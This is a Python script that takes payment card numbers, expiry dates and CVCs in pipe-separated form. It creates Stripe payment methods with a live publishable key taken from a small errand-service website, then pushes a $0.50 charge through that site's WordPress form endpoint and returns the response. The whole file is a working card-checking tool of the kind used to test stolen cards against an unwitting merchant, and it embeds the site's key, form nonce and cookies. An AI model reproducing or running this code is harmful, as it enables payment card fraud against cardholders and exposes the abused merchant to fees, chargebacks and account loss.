import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 4)
	random2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F5412f474d5%3B+stripe-js-v3%2F5412f474d5%3B+card-element&referrer=https%3A%2F%2Ftymlierrands.com&time_on_page=48844&client_attribution_metadata[client_session_id]=d8b03559-8886-440d-b47f-45e9d42b1f9c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51QAIwdCjD5LgqSogPsNwC9Y8fApUsGHPKuoJXYABa5Um1l7YPqOIRsgJjzBgDckMiiuS8UPNwaolahqwXpGgz9QK00L4jgO4oK'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.1378298014.1774103503',
	    '_ga_BEWSKNQZ7P': 'GS2.1.s1774103503$o1$g1$t1774103551$j12$l0$h0',
	}
	
	headers = {
	    'authority': 'tymlierrands.com',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.1378298014.1774103503; _ga_BEWSKNQZ7P=GS2.1.s1774103503$o1$g1$t1774103551$j12$l0$h0',
	    'origin': 'https://tymlierrands.com',
	    'referer': 'https://tymlierrands.com/pay-test/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1774103559044',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=2281&_fluentform_23_fluentformnonce=227388b17c&_wp_http_referer=%2Fpay-test%2F&pickup_address%5Baddress_line_1%5D=&pickup_address%5Bcity%5D=&pickup_address%5Bstate%5D=&pickup_address%5Bzip%5D=&dropoff_address%5Baddress_line_1%5D=&dropoff_address%5Bcity%5D=&dropoff_address%5Bstate%5D=&dropoff_address%5Bzip%5D=&calculated_miles=&datetime=03%2F21%2F2026&dropdown=&dropdown_2=Cartons&input_radio=no&description=&estimated_weight=&flights_of_stairs=&custom_payment_amount_1=0.50&payment_method=stripe&names%5Bfirst_name%5D=&email=&phone=&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '23',
	}
	
	response = requests.post(
	    'https://tymlierrands.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return response.text
